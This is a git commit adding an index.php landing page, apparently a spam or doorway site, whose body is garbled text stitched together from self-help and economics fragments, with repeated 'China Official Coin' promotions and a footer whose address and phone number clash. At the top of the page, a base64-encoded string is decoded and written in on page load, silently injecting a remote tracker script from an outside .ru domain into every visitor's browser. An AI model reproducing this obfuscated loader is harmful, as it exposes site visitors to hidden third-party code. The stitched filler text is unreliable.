1f93e657e6fcea48f4d4dde0be0a38516b2d31d4
fdhwncyl <81930650+fdhwncyl@users.noreply.github.com>
2021-04-04 23:23:45 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl84M3o1NXhubXA5dXBtMjE1NTAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Management is dismemberment, analysis, sequencing, concrete implementation.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="c6r9gd6z5ojgz36g">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="rjapj560myfv72hilymkt7h">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Management is dismemberment, analysis, sequencing, concrete implementation.</h1>
+	</section>
+
+
+	<section class="our-work" class="vhs09ydml138t5p7aga2c">
+		<h3 class="title">What a delightful positive social mirror they can b</h3>
+		<p>And fourth, identify new options for achieving these results. China Official Coin: Singapore, South Korea, Malaysia.  - Honey, Stephen just came in for a few minutes to help us.  Sandra experienced the deepest self-penetration and immersion in the emotional origins of her relationship to Frigidare.I also discovered new aspects of her personality and felt even more respect for her.  But this requires a huge amount of self-confidence, openness and willingness to take risks from a person.  In order to recognize and develop them, in order to use them in accordance with our deepest needs, we must think differently, shift our paradigms to a new, deeper level - "from the inside out".  ...  In the case when, on the contrary, the demand for products manufactured using these resources is inelastic, the demand for resources is also inelastic; - the second factor is the substitutability of resources. </p>
+		<hr>
+
+		<ul class="grid" class="wky9kczeocvdu3z7gutu0r">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="vhs09ydml138t5p7aga2c">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>We use the execution delegation described in Habit 3, the same method management I used with Sandra when I asked her to take a picture </td>
+    <td>They read their biographies in other people's lives.  This discussion ended with a new spirit of excitement, hope and proacti</td>
+    <td>How many times have you been told: stop playing the fool! You're a capable boy, you're just lazy.  The amount of social benefits may depend on</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Habits 5 and 6 have a lot to do with two parts of this process, and we'll take a deeper look at them in the next two parts of the book.  The power of i</td>
+    <td>You get what you encourage.  Each of its generations is created on the basis of the previous one, and each propels us to an ever greater opportunity</td>
+    <td>The children, eagerly awaiting the trip, sat quietly.  Many people, whether they are familiar with the idea of ​​Square II or not, un</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>He shared with his daughter, told her about his worries and worries, and it was he who instilled in Sandra a deep respect</td>
+    <td>Promise yourselfthat you will maintain a balance between courage in achieving your goal and sensitivity to someone else's point of v</td>
+    <td>“Do you think he understands that Jenny’s newborn?” I asked.  You know, I have one serious problem.  I lift my foot off the brake pedal and neutralize any negative</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="c6r9gd6z5ojgz36g">
+		<h3 class="title">Various enterprises are located on the gro</h3>
+		<p>The new president met with me and said:“I am not very comfortable with this software change.  As a result, the employee of a certain type of labor is able to use the products of any other specific type of labor; 2) specialization.  The other day I read one of these letters from her on the plane, and tears ran down my cheeks.  Each of us is concerned or worried about a wide range of issues and phenomena: our health, our children, our problems at work, the problems of our state's debt, the threat of nuclear war.We can separate all these things from those that do not have much emotional or intellectual influence on us by placing them in the "Circle of Concerns".  Land as a resource means not only the land itself, but also the natural resources that are on the earth and in its depths.  You become a self-confident, knowledgeable, proactive person, independent of the attitudes, behaviors and actions of others.  Except in situations where people can barely make ends meet, mental compensation is often more challenging than financial compensation.  On such occasions, I usually hid in my sink. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rjapj560myfv72hilymkt7h" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="vhs09ydml138t5p7aga2c">
+		<h3 class="title">One of the most useful practical results of a principle orienta</h3>
+		<p>Target management takes place when, in solving all production and other management tasks at all levels, the goal plays the main role. Chinese Coin: Sales Open In Today.  The left deals with consistent thinking; right - with synchronous, simultaneous,when the object is perceived as a whole.  3.  The more efficient you are in managing your life (Habit 3), the more renewing actions from Square II you can take (Habit 7).  Suddenly I saw everything quite differently, and when I saw everything differently, I began to think differently, began to feel differently, behave differently.  How their example inspires us! Nothing makes a stronger and more lasting impression on a person than the realization that the other has overcome his suffering, conquered circumstances and was the embodiment and expression of those values ​​that inspire, ennoble and elevate life. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="wky9kczeocvdu3z7gutu0r" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="wky9kczeocvdu3z7gutu0r" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="c6r9gd6z5ojgz36g">
+		<h3 class="title">This learning process can take weeks or even months</h3>
+		<p>Such manifestations of the modern social paradigm show that we are largely determined by various programs and conditions.yami.  If you still haven't seriously thought about roles in your life, just write down what comes to mind first.  Therefore, when making a decision, she is obliged to reckon with this circumstance.  If you really strive for sincere understanding without hypocrisy and a back thought, then the time will come when you will be literally overwhelmed by the pure stream of understanding that will rush to you from the other person.You don't even always need to speak for empathy.  The function of providing employment should be emphasized.  Demand is determined by the amount of certain goods that consumers can buy at prevailing prices and monetary incomes.Changes in demand depend on the following factors.  Now that we've started talking about effectively interacting with other people, let's return to our definition of effectiveness.  But realizing that we have these various possibilities,we are able to consciously use our intelligence to better meet specific needs.  In this case, the manager acts as a car that sets the pace in races. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rjapj560myfv72hilymkt7h" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="vhs09ydml138t5p7aga2c">
+		<h3 class="title">Demand is determined by the amount of cert</h3>
+		<p>In The Seven Habits of Highly Effective People, he offers us an opportunity, not an instruction, to answer the question "How?" This opportunity lies in using the wise teachings of Covey to better know ourselves and our influence on other people.  Changes in demand for one product in this case will not affect the value of demand for others.  Income.  Relationships Based on our character, we build and develop Win / Win relationships.  However, proper delegation to others is perhaps the most powerful and most effective of all human activities available.  - to my brother John for his love, interest, insight and spiritual purity.  If one firm lowered the price, then its competitors, feeling the outflow of buyers, inIn this case, a wide variety of solutions of competitors are possible: they can jointly achieve certain goals, turning the industry into a kind of pure monopoly, or fight each other.  Even if I make a mistake, this level of trust, this emotional reserve can compensate for it.  It was a planned outing: outdoor physical workout, wrestling competitions, hot dogs, lemonade, and a movie - the complete set.  Economic rivalry in conditions of monopolistic competition is not limited to price alone,but also focuses on factors such as product quality, advertising, etc.  The option of a direct agreement between the oligopolists is not excluded. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="wky9kczeocvdu3z7gutu0r" class="title">The essence of synergy is to value differences.  When we starte</h3>	
+		<p>Negative Synergy The search for a third alternative is a major paradigm shift, accompanied by a rejection of the either-or-opposing mentality. China Official Coin: Singapore, South Korea, Malaysia.  Figure: 1.  Therefore, when making a decision, she is obliged to reckon with this circumstance.  If your focus is: Family Internal security: Your security is based onhow your family perceives you and how you meet their expectations.  One of these difficult episodes was associated with a characteristic feature of my personality.  Any form of state regulation consists of material, institutional and conceptual components.Social regulation is not the exclusive privilege of the state.  - If I had a degree ...  There are several foundations of power in an enterprise.  We presented them with the newly developed additional goals and criteria and said: - As we expected, management wants to set additional goals for you with even more stringent criteria than before.  But one of the leaders was proactive.He was guided by values, not feelings.  We revised our programs, rewrote our scripts and began to allocate in our life schedule the time necessary for the important actions of Square II - deep communication with each other.  Just listen and try to understand. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="c6r9gd6z5ojgz36g">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="rjapj560myfv72hilymkt7h"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="vhs09ydml138t5p7aga2c"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="wky9kczeocvdu3z7gutu0r"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>4889 Kreiger Mission, Apt. 809, 52273-4004, Charliemouth, Alabama, United States</p>
+		<p>Phone number: +49(53)544-8474056</p>
+	</footer>
+
+</body>
+
+</html>
